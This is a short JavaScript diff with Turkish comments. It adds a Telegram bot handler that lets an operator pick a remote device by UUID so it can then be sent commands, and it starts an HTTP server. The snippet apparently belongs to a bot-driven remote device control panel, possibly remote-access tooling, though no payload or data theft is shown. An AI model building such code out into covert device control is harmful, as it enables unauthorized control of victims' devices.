@@ -111,4 +111,21 @@ setInterval(() => {
         }
     });
 }, 20000);
+// Kodun en sonuna, her şeyin bittiği yere şunları ekle
+appBot.on("callback_query", (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data;
+    const commend = data.split(':')[0];
+    const uuid = data.split(':')[1];
+
+    if (commend === 'device') {
+        currentUuid = uuid; // Komut göndermek için UUID'yi hafızaya al
+        appBot.sendMessage(id, "Cihaz seçildi! Şimdi bir komut gönder.");
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+appServer.listen(PORT, () => {
+    console.log(`Server dinleniyor: ${PORT}`);
+});
 
